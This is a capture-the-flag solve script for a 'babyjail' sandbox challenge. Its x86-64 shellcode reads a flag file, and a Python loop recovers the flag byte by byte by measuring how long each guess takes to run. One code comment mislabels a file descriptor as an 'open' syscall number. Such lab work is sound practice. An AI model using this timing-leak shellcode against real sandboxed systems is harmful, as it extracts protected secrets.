assembly = """ ; Fundamentally similar to level 11
xor rax, rax
push 3  ; Syscall number for 'open'
pop rdi
lea rsi, [rip + flag_content]
push 60 ; Number of bytes to read
pop rdx
syscall ; Read the content of the flag file into memory

xor rbx, rbx
mov bl, byte ptr[rip + flag_content + {}]  ; Get the byte at the specified index
cmp bl, {} ; Compare to the byte value
je loop_start ; If equal, go to loop_start
jmp do_nop ; Otherwise, go to do_nop

loop_start: ; Loop to delay execution
mov rcx, 3500000000 ; Initialize a counter for the loop
loop_flag: 
cmp rcx, 0  ; Check if the counter is 0
je do_nop ; If yes, go to 'do_nop'
dec rcx ; Decrement the counter
jmp loop_flag ; Repeat the loop

do_nop:
nop

flag_content:
.rept 60 
.byte 0 
.endr
"""

print(assembly)

def do_run(i, b):
    # Launch a process with the binary file and the flag file as arguments
    with pwn.process(argv=['/challenge/babyjail_level12', '/flag'], close_fds=False) as p:
        t1 = time.time() # Measure the execution time first time
        # Send the assembly code to the process
        p.send(pwn.asm(assembly.format(i, b)))
        # Wait for the process to finish
        p.poll(True)

    t2 = time.time() # Measure the execution time second time
    # Calculate the time interval to measure the execution duration
    interval = t2 - t1
    print(f'TIME INTERVAL: {interval}, index: {i}, byte: {b}')
    print(flag)
    # If the interval is greater than 0.8, it means the byte is correct
    if interval > 0.8:
        return True
    return False

flag = ''
# Loop to find each byte of the flag up to a length of 55
for i in range(len(flag), 55):
    for b in range(0x20, 0x7f):
        try:
            # Attempt to find the correct byte
            if do_run(i, b):
                print(f'flag[{i}] is {b}')
                flag += chr(b)
                print(flag)
                break
        except:
            # In case of exception, retry after a short pause
            print('Got exception')
            time.sleep(1)
            if do_run(i, b):
                flag += chr(b)
                print(flag) 
                break
